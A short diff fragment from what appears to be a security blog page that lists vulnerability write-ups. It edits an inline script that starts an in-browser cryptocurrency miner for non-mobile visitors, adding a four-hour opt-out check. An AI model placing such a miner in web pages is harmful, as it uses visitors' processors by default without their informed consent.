@@ -196,7 +196,7 @@ discuz X 任意文件删除漏洞学习yxcms1.2.6任意文件删除漏洞分析j
 
 	// Only start on non-mobile devices and if not opted-out
 	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile()) {
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		miner.start();
 	}
 </script>  
